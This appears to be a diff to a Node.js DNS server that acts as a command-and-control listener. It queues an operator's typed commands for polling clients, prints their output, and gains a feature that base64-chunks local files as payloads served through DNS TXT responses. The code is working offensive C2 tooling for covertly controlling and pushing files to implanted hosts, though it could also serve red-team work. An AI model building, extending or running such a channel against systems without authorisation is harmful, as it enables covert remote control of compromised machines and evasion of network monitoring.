@@ -1,10 +1,13 @@
 const dgram = require('dgram');
 const Buffer = require('buffer').Buffer;
 const readline = require('readline');
+const fs = require('fs');
+const path = require('path');
 
 const host = '0.0.0.0';
 const port = 53;
 const commandQueue = [];
+const payloads = [];
 
 const length_descending = (a, b) => b.length - a.length;
 const domains = process.argv.length > 2 ? process.argv.slice(2).sort(length_descending) : [];
@@ -190,6 +193,23 @@ sock.on('message', function(req, rinfo) {
           rl.prompt(true);
           resp = commandQueue.length > 0 ? commandQueue.shift() : 'nop';
         }
+
+        if (resp.startsWith('payload ')) {
+          const pd = parseInt(resp.substr(8));
+
+          if (payloads[pd].chunks.length < 1) {
+            const pdata = payloads[pd].data;
+            const chunk_max = max_txt; // I have not edge case tested this math
+            const n_chunks = Math.ceil(pdata.length / chunk_max);
+
+            for (let j = 0; j < n_chunks; j++) {
+              payloads[pd].chunks[j] = pdata.substr(j*chunk_max, chunk_max);
+            }
+          }
+
+          const pobj = payloads[pd];
+          resp = 'payload ' + pobj.filename + ' ' + pd + ' ' + pobj.chunks.length;
+        }
       }
     } else {
       const output = unpack(selector);
@@ -198,15 +218,39 @@ sock.on('message', function(req, rinfo) {
         rl.prompt(true);
         return;
       }
-      console.log();
-      if (output === '\xde\xadDONE') {
-        console.log();
+      if (output === '\xde\xadDN') {
         rl.prompt(true);
-      } else {
-        process.stdout.write(output);
-      }
+        resp = 'ok';
+      } else if (output === '\xde\xadPD') {
+        console.log('DONE');
+        rl.prompt(true);
+        resp = 'ok';
+      } else if (output.startsWith('\xde\xadPL')) {
+        const args = output.split(' ');
+        if (args.length < 3) {
+          console.log('\n[WARN] Malformed payload chunk request; tampering detected');
+          rl.prompt(true);
+          return;
+        }
 
-      resp = 'ok';
+        try {
+          const pd = parseInt(args[1]);
+          if (pd > payloads.length) {
+            console.log('\n[WARN] Request for nonexistent payload; tampering detected');
+            rl.prompt(true);
+            return;
+          }
+          const chunknum = parseInt(args[2]);
+          resp = payloads[pd].chunks[chunknum];
+        } catch (e) {
+          console.log('\n[WARN] Malformed payload chunk request; tampering detected');
+          rl.prompt(true);
+          return;
+        }
+      } else {
+        console.log(output);
+        resp = 'ok';
+      }
     }
 
     const responseBuffer = buildResponse(query, i, resp);
@@ -266,7 +310,47 @@ const rl = readline.createInterface({
 });
 
 rl.on('line', function (cmd) {
-  commandQueue.push(cmd.trim());
+  cmd = cmd.trim();
+  if (cmd == 'payload') {
+    console.log('Usage: payload <filename>|<payload number>');
+    console.log('Use "payloads" to see current stored payloads.');
+    rl.prompt();
+    return;
+  } else if (cmd == 'payloads') {
+    console.log('Stored payloads:');
+    for (let i = 0; i < payloads.length; i++) {
+      console.log(i+':', payloads[i].filename);
+    }
+    rl.prompt();
+    return;
+  } else if (cmd.startsWith('payload ')) {
+    const arg = cmd.substr(8);
+    let pd = parseInt(arg);
+    if (pd >= payloads.length) {
+      console.log('A payload with this number does not yet exist.');
+      rl.prompt();
+      return;
+    }
+    if (!Number.isInteger(pd)) {
+      pd = payloads.length;
+      try {
+        const data = fs.readFileSync(arg);
+
+        payloads.push({
+          filename: path.basename(arg),
+          data: data.toString('base64'),
+          chunks: [],
+        });
+      } catch (e) {
+        console.log('Could not read file', arg);
+        rl.prompt();
+        return;
+      }
+    }
+    commandQueue.push('payload '+pd);
+  } else {
+    commandQueue.push(cmd);
+  }
 //  rl.prompt();
 });
 
